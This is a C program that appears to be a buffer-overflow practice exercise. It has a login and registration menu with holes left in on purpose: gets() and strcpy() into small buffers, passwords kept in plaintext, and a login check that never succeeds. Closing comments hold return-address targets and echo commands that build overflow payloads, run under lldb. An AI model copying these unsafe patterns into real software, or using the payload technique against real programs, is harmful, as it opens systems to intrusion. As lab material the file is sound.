

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdbool.h>

#define MAX_LEN 7

void showAllPasswords() {
    FILE *file = fopen("UsersAndPasswords.txt", "r");
    if (file == NULL) {
        perror("Failed to open file");
        return;
    }

    char line[256];
    printf("Here are all the passwords:\n");
    while (fgets(line, sizeof(line), file)) {
        printf("%s", line);
    }

    fclose(file);
}

void registerUser(const char *filename) {
    char username[MAX_LEN];
    char password[MAX_LEN];

    printf("Enter username: ");
    fgets(username, MAX_LEN, stdin);
    username[strcspn(username, "\n")] = 0;

    printf("Enter password: ");
    fgets(password, MAX_LEN, stdin);
    password[strcspn(password, "\n")] = 0;

    FILE *file = fopen(filename, "a");
    if (file == NULL) {
        perror("Failed to open file");
        return;
    }

    fprintf(file, "%s %s\n", username, password);
    fclose(file);

    printf("User registered successfully.\n");
}

bool login(void) {
    
    char buffer[7]={3,3,3,3,3,3,3};
    char username[MAX_LEN]={1,1,1,1,1,1,1};
    bool success = false;
    char password[MAX_LEN]={2,2,2,2,2,2,2};

    printf("Please enter your username: ");
    gets(username); 

    printf("Please enter your password: ");
    gets(password); 

    if (success) {
        success = true;
    } 
    return success;
}

void vulnerableFunction(char *str) {
    char buffer[50];
    strcpy(buffer, str); 
    printf("Buffer content: %s\n", buffer);
}

void print_menu() {
    printf("1. Register\n");
    printf("2. Login\n");
    printf("3. Exit\n");
}

int main() {
    int choice;
    const char *filename = "UsersAndPasswords.txt";
    while (1) {
        print_menu();
        printf("Enter choice: ");
        scanf("%d", &choice);
        getchar();
        if (choice == 1) {
            registerUser(filename);
        } else if (choice == 2) {
            if (login()) {
                printf("Login successful\n");
            } else {
                printf("Login failed\n");
            }
        } else if (choice == 3) {
            break;
        } else {
            printf("Invalid choice\n");
        }
    }



    return 0;
}

//0x100003d6e

// i wanna be here 0x100003d7b

//0x100003a50

//(echo "2"; echo ""; echo -n -e "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xa0\xee\xef\xbf\xf7\x7f\x00\x00\x7b\x3d\x00\x00\x01\x00\x00\x00") > input.bin
//lldb ./main
//process launch -i input.bin

//(

//(echo "2"; echo ""; echo -n -e "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xa0\xee\xef\xbf\xf7\x7f\x00\x00\x50\x3a\x00\x00\x01\x00\x00\x00") > input1.bin
//process launch -i input1.bin